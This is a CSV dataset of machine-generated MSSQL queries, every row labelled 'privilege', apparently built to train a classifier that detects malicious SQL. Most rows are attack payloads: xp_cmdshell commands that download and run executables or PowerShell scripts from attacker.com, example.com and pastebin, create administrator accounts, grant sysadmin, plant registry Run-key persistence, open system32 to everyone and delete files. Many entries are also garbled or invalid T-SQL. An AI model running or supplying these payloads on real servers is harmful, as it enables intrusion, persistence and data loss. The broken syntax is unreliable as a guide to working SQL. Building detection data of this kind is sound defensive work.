query,label,label_name,source
EXECUTE AS USER = 'NT AUTHORITY\\SYSTEM',3,privilege,generated_groq_mssql_simple
ALTER SERVER ROLE sysadmin ADD MEMBER [domain\\user];,3,privilege,generated_groq_mssql_simple
"xp_cmdshell 'net user password',",3,privilege,generated_groq_mssql_simple
xp_cmdshell 'wmic process call create calc.exe ',3,privilege,generated_groq_mssql_simple
"sp_addsrvrolemember 'domain\\user', 'sysadmin'",3,privilege,generated_groq_mssql_simple
"sp_addsrvrolemember 'sa', 'securityadmin'",3,privilege,generated_groq_mssql_simple
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server',3,privilege,generated_groq_mssql_simple
EXEC master..xp_create_subdir 'C:\\\\path\\\\to\\\\dir',3,privilege,generated_groq_mssql_simple
EXEC master..xp_fileexist 'C:\\\\file.txt',3,privilege,generated_groq_mssql_simple
EXEC xp_cmdshell 'taskkill /IM iexplore.exe',3,privilege,generated_groq_mssql_simple
EXEC master..xp_dirtree 'C:\\\\drive',3,privilege,generated_groq_mssql_simple
EXEC xp_cmdshell 'echo 123 > C:\\\\temp\\\\output.txt',3,privilege,generated_groq_mssql_simple
EXEC master..xp_subdirs 'C:\\\\path\\\\to\\\\dir',3,privilege,generated_groq_mssql_simple
xp_cmdshell 'cmd /c echo hello > c:\\test.txt';,3,privilege,generated_groq_mssql_simple
"sp_addsrvrolemember 'test_user', 'sysadmin';",3,privilege,generated_groq_mssql_simple
"EXEC master..sp_addserver 'linked_server', 'local';",3,privilege,generated_groq_mssql_simple
EXEC master..sp_MSforeachdb 'SELECT * FROM [?].[master].[sys].[databases];',3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'type c:\\test.txt';,3,privilege,generated_groq_mssql_simple
"EXEC master..sp_addlinkedserver 'linked_server', 'SQL Server', 'SQL Server', 'linked_server';",3,privilege,generated_groq_mssql_simple
EXECUTE AS USER='test_user' SELECT * FROM master.sys.databases;,3,privilege,generated_groq_mssql_simple
"EXEC master..sp_addrolemember 'sysadmin', 'test_user';",3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'net user test_user Password1 /add';,3,privilege,generated_groq_mssql_simple
"EXEC master..sp_addsrvrolemember 'test_user', 'sysadmin';",3,privilege,generated_groq_mssql_simple
"EXEC master..sp_MSforeachdb 'SELECT * FROM [?].[master].[sys].[databases]; OPENROWSET('SQL NCLI', 'Server=linked_server;Trusted_Connection=yes;', 'SELECT * FROM [master].[sys].[databases]');'",3,privilege,generated_groq_mssql_simple
"EXEC master..EXEC sp_addlinkedserver @server = 'linked_server', @srvproduct = 'SQL Server', @provider = 'SQLNCL11', @datasrc = 'linked_server', @local = 0;",3,privilege,generated_groq_mssql_simple
"EXECUTE AS USER='test_user' EXEC master.sys.sp_addsrvrolemember 'test_user', 'sysadmin';",3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'powershell -Command ,3,privilege,generated_groq_mssql_simple
",
EXEC master..xp_cmdshell 'whoami';",3,privilege,generated_groq_mssql_simple
EXECUTE AS USER='test_user' EXEC master.sys.sp_MSforeachdb 'SELECT * FROM [?].[master].[sys].[databases];' REVERT;,3,privilege,generated_groq_mssql_simple
"EXEC master..sp_addlinkedserver 'linked_server', 'SQL Server', 'SQL Server', 'linked_server', 'sa', NULL;",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile evil.exe; Start-Process -FilePath evil.exe -Verb RunAs\""';",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""New-Item -ItemType Directory -Path C:\\\\evil\""'",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""Copy-Item -Path C:\\\\evil\\\\* -Destination C:\\\\windows\\\\system32\""'",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""icacls \""C:\\\\windows\\\\system32\"" /inheritance:r\""';",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""icacls \""C:\\\\windows\\\\system32\"" /grant:r everyone:f\""';",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""New-PSDrive -PSProvider FileSystem -Root \\\\\\. -Credential (New-Object System.Management.Automation.PSCredential (\""DOMAIN\\USER\"", (ConvertTo-SecureString \""PASSWORD\"" -AsPlainText -Force)))\""';",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""Copy-Item -Path C:\\\\windows\\\\system32\\\\evil.dll -Destination \\\\\.\\\\c\\\windows\\\system32\""'",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""Add-Type -Path \\\\.\\\\c\\\windows\\\system32\\\\evil.dll\""'",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""[evil.type]::evilMethod()\""'",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""[Reflection.Assembly]::LoadFrom('\\\\\.\\\\c\\\windows\\\system32\\\\evil.dll'); [evil.type]::evilMethod()\""'",3,privilege,generated_groq_mssql_simple
"EXEC xp_cmdshell 'powershell -Command \""Add-Type -TypeDefinition @\\\'\\\' public class evil { public static void evilMethod() { } }\\\'\\\'\""",3,privilege,generated_groq_mssql_simple
--sp_addsrvrolemember query omitted for security reasons,3,privilege,generated_groq_mssql_simple
"EXEC master..xp_logreader 1, NULL, '\\\\.\\pipe\\my_pipe'",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_regread 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'evil'",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_sqldmo 'EXEC xp_sqldmo 2, \""SELECT * FROM sys.configurations\""';",3,privilege,generated_groq_mssql_simple
"OPENROWSET('SQLNCLI', 'Server=my_server;Database=my_database;UID=my_username;PWD=my_password', 'SELECT * FROM my_table')",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'evil', 'REG_SZ', 'evil.exe';",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_sscanf 0x12345678, 0xfeedface, NULL",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_sqldmo 0, 'CREATE TABLE evil (id INT, name VARCHAR(255))'",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_sqldmo 0, 'INSERT INTO evil VALUES (1, \""<script>alert(1)</script>\"")'",3,privilege,generated_groq_mssql_simple
"EXEC master..xp_sqldmo 0, 'EXEC xp_cmdshell \""powershell -Command \""Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile evil.exe; Start-Process -FilePath evil.exe -Verb RunAs\""\""';",3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'cmd /c echo foo > c:\bar.txt';,3,privilege,generated_groq_mssql_simple
"sp_addsrvrolemember 'login', 'sysadmin';",3,privilege,generated_groq_mssql_simple
"EXEC master..sp_addsrvrolemember 'login', 'sysadmin';",3,privilege,generated_groq_mssql_simple
EXEC xp_cmdshell 'net user admin P@ssw0rd /add';,3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'c:\\path\\to\\executable.exe';,3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'cmd /c del *';,3,privilege,generated_groq_mssql_simple
EXEC sp_executesql N'EXECUTE xp_cmdshell ''cmd /c echo foo'' WITH NOWAIT';,3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'notepad.exe';,3,privilege,generated_groq_mssql_simple
"OPENROWSET('SQLOLEDB','MSDASSQL;Data Source=<IP>;Initial Catalog=master','SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES');",3,privilege,generated_groq_mssql_simple
"sp_addsrvrolemember 'login', 'securityadmin';",3,privilege,generated_groq_mssql_simple
EXEC master..sp_enumserverroles; -- to get role ids for sysadmin,3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'c:\\path\\to\\file.txt';,3,privilege,generated_groq_mssql_simple
"EXEC master..xp_cmdshell 'powershell.exe -Command \""whoami\""';",3,privilege,generated_groq_mssql_simple
EXEC sp_executesql N'reginsert ' + 'exec xp_cmdshell ''whoami'';';,3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'c:\\path\\to\\cmd.exe';,3,privilege,generated_groq_mssql_simple
"EXEC sp_addlinkedserver '<linkedsrvname>', 'SQLNCLI11;Data Source=<linkedsrvip>;Initial Catalog=master';",3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'whoami /priv';,3,privilege,generated_groq_mssql_simple
EXECUTE AS LOGIN = 'domain\username';,3,privilege,generated_groq_mssql_simple
EXEC master..xp_cmdshell 'net user admin /delete';,3,privilege,generated_groq_mssql_simple
EXEC sp_executesql N'reginsert exec master..xp_cmdshell ''echo foo'';';,3,privilege,generated_groq_mssql_simple
query,3,privilege,generated_groq_mssql_simple
EXEC xp_cmdshell 'dir c:\\',3,privilege,generated_groq_mssql_simple
"sp_addsrvrolemember 'sa', 'sqlagentoperator'",3,privilege,generated_groq_mssql_simple
DECLARE @cmd nvarchar(255) = 'cmd /c net user testuser password /add'; EXEC master..xp_cmdshell @cmd;,3,privilege,generated_groq_mssql_advanced
"EXEC master..sp_addsrvrolemember 'testuser', 'sysadmin';",3,privilege,generated_groq_mssql_advanced
"DECLARE @server sysname = 'testserver'; EXEC master..sp_addlinkedserver @server, 'testdescription', 'SQL_NCLTWP', 'testdatasource';",3,privilege,generated_groq_mssql_advanced
"'SELECT * FROM openrowset(''SQLNCLI', ''Server=(local);Trusted_Connection=yes'', ''SELECT name FROM master.dbo.sysdatabases;'')",3,privilege,generated_groq_mssql_advanced
"CREATE SERVER AUTHORIZATION [testuser]; EXEC ('CREATE TABLE [testuser].dbo.testtable (id int, name varchar(255))');",3,privilege,generated_groq_mssql_advanced
"EXECUTE AS LOGIN = 'testuser'; CREATE TABLE testtable (id int, name varchar(255)); REVERT;",3,privilege,generated_groq_mssql_advanced
"EXEC('CREATE TABLE testuser.dbo.testtable(id int, name varchar(255)); INSERT INTO testuser.dbo.testtable (id, name) VALUES (1, ''testname'');')",3,privilege,generated_groq_mssql_advanced
"EXEC master..sp_MSforeachdb 'SELECT @dbname = db_name(), @query = ''INSERT INTO testuser.dbo.testtable (id, name) VALUES (1, ''testname'')''; EXEC(''SET @query;'')'",3,privilege,generated_groq_mssql_advanced
"DECLARE @s nvarchar(max) = ''; SELECT @s += CONVERT(nvarchar(max), a); EXEC sp_executesql @s;",3,privilege,generated_groq_mssql_advanced
"DECLARE @sql nvarchar(max) = 'CREATE TABLE testuser.dbo.testtable(id int, name varchar(255)); INSERT INTO testuser.dbo.testtable (id, name) VALUES (1, ''testname'');'; EXEC sp_executesql @sql;",3,privilege,generated_groq_mssql_advanced
'CREATE FUNCTION testuser.dbo.testfunction ( @x INT ) RETURNS INT   AS  BEGIN    RETURN  @x * @x;  END;,3,privilege,generated_groq_mssql_advanced
"SELECT * FROM openrowset(''SQLOLEDB'', ''Provider=SQLOLEDB;Data Source=(local);''',''SELECT name FROM master..sysdatabases;'')",3,privilege,generated_groq_mssql_advanced
'EXEC ('''+QUOTENAME(''testuser'')+''''+QUOTENAME(''sysadmin'')+''''+'''';'),3,privilege,generated_groq_mssql_advanced
"EXEC ('SELECT * INTO testuser.dbo.testtable FROM openrowset(''SQLNCLI'',''Server=(local);Trusted_Connection=yes''',''SELECT name FROM master.dbo.sysdatabases;''))",3,privilege,generated_groq_mssql_advanced
"CREATE PROCEDURE testuser.dbo.testprocedure AS BEGIN  EXEC(''CREATE TABLE testuser.dbo.testtable(id int, name varchar(255)); INSERT INTO testuser.dbo.testtable (id, name) VALUES (1, ''testname'');''); END;",3,privilege,generated_groq_mssql_advanced
CREATE LOGIN [test_login] FROM WINDOWS;,3,privilege,generated_groq_mssql_advanced
"EXEC xp_cmdshell 'whoami>', N'uid=1', N'gid=1', 1;",3,privilege,generated_groq_mssql_advanced
sp_addsrvrolemember 'NT AUTHORITY\SYSTEM';,3,privilege,generated_groq_mssql_advanced
"EXEC master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Microsoft SQL Server', 'CurrentVersion';",3,privilege,generated_groq_mssql_advanced
"SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Text;Database=G:\\', 'SELECT * FROM file.txt');",3,privilege,generated_groq_mssql_advanced
"EXEC ('INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0', ''G:\\' , ''SELECT * FROM file.txt'') VALUES (''X'');', N'uid=1', N'gid=1', 1);",3,privilege,generated_groq_mssql_advanced
"@sql = 'INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0', ''G:\\' , ''SELECT * FROM file.txt'') VALUES (''X'');'; EXEC xp_cmdshell @sql;",3,privilege,generated_groq_mssql_advanced
"EXEC ('xp_cmdshell ''net user admin /add''', N'uid=1', N'gid=1', 1);",3,privilege,generated_groq_mssql_advanced
execute as user='NT AUTHORITY\SYSTEM' begin exec xp_cmdshell 'net user admin /add' end;,3,privilege,generated_groq_mssql_advanced
"execute as user='NT AUTHORITY\SYSTEM' begin declare @sql nvarchar(400); set @sql = 'INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0', ''G:\\' , ''SELECT * FROM file.txt'') VALUES (''X'');'; exec sp_executesql @sql end;",3,privilege,generated_groq_mssql_advanced
"WITH cte AS (SELECT TOP 1 name FROM sys.server_principals ORDER BY name) INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'G:\\', ''SELECT * FROM file.txt'') VALUES (CTE.name)",3,privilege,generated_groq_mssql_advanced
declare @sql nvarchar(400); SET @sql = 'xp_cmdshell ''net user admin /add'''; EXEC master..sp_executesql @sql;,3,privilege,generated_groq_mssql_advanced
WITH cte AS (SELECT TOP 1 name FROM sys.server_principals ORDER BY name) EXEC master..sp_addsrvrolemember cte.name;,3,privilege,generated_groq_mssql_advanced
execute as user='NT AUTHORITY\SYSTEM' begin declare @sql nvarchar(400); set @sql = 'xp_cmdshell ''whoami'''; EXEC master..sp_executesql @sql end;,3,privilege,generated_groq_mssql_advanced
execute as user='NT AUTHORITY\SYSTEM' begin declare @sql nvarchar(400); set @sql = 'xp_cmdshell ''net user admin /add'''; EXEC xp_cmdshell @sql end;,3,privilege,generated_groq_mssql_advanced
"WITH CTE AS (SELECT TOP 1 name FROM sys.server_principals ORDER BY name) SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'G:\\', ''SELECT * FROM file.txt'') AS T1 JOIN CTE AS T2 ON T1.id = T2.id;",3,privilege,generated_groq_mssql_advanced
"EXEC ('xp_cmdshell ''net user test /add''', N'uid=1', N'gid=1', 1);",3,privilege,generated_groq_mssql_advanced
"EXEC xp_cmdshell 'powershell.exe -c \""whoami\""'",3,privilege,generated_groq_mssql_advanced
EXEC xp_cmdshell 'net user /domain',3,privilege,generated_groq_mssql_advanced
"EXEC sp_addsrvrolemember 'sa', 'sysadmin'",3,privilege,generated_groq_mssql_advanced
EXEC master..xp_execresultset 'declare @x int; set @x= @@servername',3,privilege,generated_groq_mssql_advanced
"OPENROWSET ('SQLNCLI', 'Server=myattackingserver;Trusted_Connection=yes;','SELECT @@servername')",3,privilege,generated_groq_mssql_advanced
EXEC xp_cmdshell 'net session',3,privilege,generated_groq_mssql_advanced
EXEC ('DECLARE @cmd nvarchar(max); SET @cmd = ''powershell.exe -c ''whoami''; EXEC xp_cmdshell @cmd').GO;,3,privilege,generated_groq_mssql_advanced
"EXEC master..xp_execresultset 'SELECT * FROM openrowset('SQLOLEDB', ''myattackingserver'', ''SELECT * FROM users WHERE 1=0'')'",3,privilege,generated_groq_mssql_advanced
CREATE SERVER LINK myattacker TO myattackingserver OPTION (SERVER PROPERTY ''',3,privilege,generated_groq_mssql_advanced
EXEC master..xp_execresultset 'EXEC(''myattacker.database.schema.object'')'',3,privilege,generated_groq_mssql_advanced
EXEC master..xp_execresultset 'EXEC(myattacker.database.schema.object)'.GO;,3,privilege,generated_groq_mssql_advanced
EXEC master..xp_execresultset 'EXEC(@sql).GO; SELECT @sql = ''EXEC('''' + ''myattacker.database.schema.object'' + ''')''',3,privilege,generated_groq_mssql_advanced
"EXEC ('EXEC sp_addsrvrolemember ''sa'', ''sysadmin''')",3,privilege,generated_groq_mssql_advanced
EXEC master..xp_execresultset 'ALTER SERVER CONFIGURATION myattacker SET TRUSTWORTHY ON',3,privilege,generated_groq_mssql_advanced
"EXEC master..xp_execresultset 'SELECT * FROM openrowset('SQLOLEDB', ''myattackingserver'', ''SELECT * FROM users WHERE 1=1 OR ''''a''''=''a'''''''",3,privilege,generated_groq_mssql_advanced
EXEC master..xp_execresultset 'EXEC(''declare @x int; set @x= @@servername; '')',3,privilege,generated_groq_mssql_advanced
"EXEC xp_cmdshell 'powershell.exe -c \""IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/ms1723.ps1'')\""'",3,privilege,generated_groq_mssql_advanced
EXEC master..xp_execresultset 'SELECT name FROM sys.triggers WHERE name like '%%my_trigger%%' AND object_id = OBJECT_ID(''my_trigger'')',3,privilege,generated_groq_mssql_advanced
"EXEC ('EXEC sp_addsrvrolemember ''sa'', ''sysadmin'''). GO; EXEC master..xp_execresultset 'SELECT * FROM openrowset('SQLOLEDB', ''myattackingserver'', ''SELECT * FROM users WHERE 1=0'')'",3,privilege,generated_groq_mssql_advanced
EXEC master..xp_commandshell 'net user /domain /user:myusername',3,privilege,generated_groq_mssql_advanced
"EXEC xp_cmdshell 'powershell -Command IEX (New-Object System.Net.WebClient).DownloadString(\""https://pastebin.com/raw/pkV4X6rK\"")';",3,privilege,generated_groq_mssql_advanced
EXEC master..xp_cmdshell 'net user Administrator /domain',3,privilege,generated_groq_mssql_advanced
EXEC master..xp_cmdshell 'powershell -Command Add-WindowsFeature -Name RSAT-AD-Tools',3,privilege,generated_groq_mssql_advanced
"SELECT openrowset('SQLNCLI', 'Server=(local);Trusted_Connection=yes;', 'SELECT @@version') AS SQLVersion;",3,privilege,generated_groq_mssql_advanced
WITH CTE AS (SELECT * FROM sys.assemblies WHERE type = 'P') SELECT * FROM CTE WHERE TYPE = 'P',3,privilege,generated_groq_mssql_advanced
"EXEC sp_addsrvrolemember 'nonadminuser', 'sysadmin'",3,privilege,generated_groq_mssql_advanced
EXEC master..xp_cmdshell 'powershell -Command Add-WindowsFeature -Name Hyper-V -IncludeManagementTools',3,privilege,generated_groq_mssql_advanced
SELECT EXECUTE AS USER = 'NT AUTHORITY\SYSTEM' 'master..xp_cmdshell ''powershell -Command IEX (New-Object System.Net.WebClient).DownloadString(''https://pastebin.com/raw/6V4X6rK'')''';,3,privilege,generated_groq_mssql_advanced
EXEC master..xp_cmdshell 'net user Administrator /domain /passwordchg',3,privilege,generated_groq_mssql_advanced
"SELECT OPENROWSET('SQLNCLI', 'Server=(local);Trusted_Connection=yes;', 'SELECT [security].*[password] FROM [security].[logins]') AS SQLPassword;",3,privilege,generated_groq_mssql_advanced
SELECT * FROM sys.dm_exec_sessions WHERE username = ''NT AUTHORITY\SYSTEM'',3,privilege,generated_groq_mssql_advanced
EXEC master..xp_cmdshell 'powershell -Command Add-WindowsFeature -Name RSAT-AD-PowerShell -IncludeManagementTools',3,privilege,generated_groq_mssql_advanced
"EXEC master.dbo.sp_addsrvrolemember 'sa', 'sysadmin';",3,privilege,generated_groq_mssql_advanced
SELECT xp_cmdshell('net user testuser testpassword * && net localgroup administrators testuser /add');,3,privilege,generated_groq_mssql_advanced
"EXEC sp_executesql N'SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0 Xml;Database=C:\Users\Public\test.xlsx', 'SELECT * FROM [Sheet1$]');",3,privilege,generated_groq_mssql_advanced
EXEC ('INSERT INTO msdb.dbo.sysagents EXEC master.dbo.xp_cmdshell ''net user testuser testpassword * && net localgroup administrators testuser /add'');,3,privilege,generated_groq_mssql_advanced
"sp_addLinkedServer @server='test_linked_server', @srvproduct='SQLServer', @provider='OLE DB', @dataaccess='OPENROWSET';",3,privilege,generated_groq_mssql_advanced
"EXEC master.dbo.sp_addlinkedserver @server='test_linked_server', @srvproduct=N'SQL Server', @provider=N'SQLOLEDB', @datasrc=N'10.0.0.1', @catalog=N'master';",3,privilege,generated_groq_mssql_advanced
CREATE SERVER AUDIT TestAudit WITH (STATE = STARTED);,3,privilege,generated_groq_mssql_advanced
"EXECUTE AS LOGIN = 'sqlagent'; INSERT INTO msdb.dbo.sysagents (name, disabled) VALUES ('testuser', 0); REVERT;",3,privilege,generated_groq_mssql_advanced
"EXEC sp_executesql N'SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', ''Excel 12.0 Xml;Database=C:\Users\Public\test.xlsx'', ''SELECT * FROM [Sheet1$] WHERE [Sheet1$][Column1] = ''test''');'",3,privilege,generated_groq_mssql_advanced
"DECLARE @Server sysname, @Database sysname, @Password nvarchar(400), @SQL nvarchar(max); SELECT @Server = 'test_linked_server', @Database = 'master', @Password = N'testpassword' EXEC ('exec (''INSERT INTO msdb.dbo.sysagents EXEC master.dbo.xp_cmdshell ''net user testuser '' + ' + @Password + ' * && net localgroup administrators testuser /add'''' FROM msdb.dbo.sysagents');",3,privilege,generated_groq_mssql_advanced
"EXEC master.dbo.sp_addsrvrolemember 'testuser', 'sysadmin'; INSERT INTO msdb.dbo.sysagents (name, disabled) VALUES ('testuser', 1);",3,privilege,generated_groq_mssql_advanced
"EXECUTE AS LOGIN = 'testuser'; DECLARE @SQL nvarchar(max); SET @SQL = N'INSERT INTO msdb.dbo.sysagents (name, disabled) VALUES (''testuser'',''0'');'; EXEC sp_executesql @SQL; REVERT;",3,privilege,generated_groq_mssql_advanced
